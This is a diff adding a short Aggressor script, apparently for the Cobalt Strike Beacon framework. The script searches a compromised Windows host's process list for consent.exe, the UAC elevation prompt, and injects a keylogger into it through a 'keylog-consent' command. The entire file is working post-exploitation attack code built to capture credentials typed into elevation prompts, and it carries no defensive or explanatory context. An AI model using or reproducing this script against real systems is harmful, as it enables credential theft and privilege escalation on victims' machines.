@@ -1,0 +1,19 @@
+
+sub keylognow {
+	bps($1, lambda({
+		local('$pid $name $entry');
+		foreach $entry (split("\n", $2)) {
+			($name, $null, $pid, $arch) = split("\\s+", $entry);
+			if ($name eq "consent.exe") {
+				[$callback: $1, $pid, $arch];
+			}
+		}
+	}, $callback => $2));
+}
+
+alias keylog-consent {
+	btask($1, "Tasked Beacon to find consent.exe and keylog it");
+	keylognow($1, {
+		bkeylogger($1, $2, $3);
+	});
+}
